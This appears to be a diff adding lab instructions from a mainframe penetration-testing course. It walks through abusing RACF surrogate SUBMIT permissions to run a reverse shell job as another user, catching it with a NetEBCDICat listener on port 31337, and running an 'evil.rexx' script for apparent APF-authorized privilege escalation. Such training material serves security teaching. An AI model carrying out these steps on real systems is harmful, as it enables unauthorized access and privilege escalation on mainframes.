@@ -1,0 +1,10 @@
+- Logon to the mainframe
+- At the READY prompt issue the command: SEARCH CLASS(SURROGAT) FILTER(*.SUBMIT)
+- Edit the reverse C shell in <userid>.LABS and add the userid to the jobcard: USER=<user you identified in the previous step without '.SUBMIT'>
+- In you Lab VM terminal run netEBCDICat: ./NetEBCDICat.py -l -p 31337
+- Submit the job
+
+- Once connected issue the command id
+- issue the command: /bin/tsocmd lu
+ - notice that this account is 'protected'
+- issue the command: /bin/tsocmd "ex 'evil.rexx(apf)'"
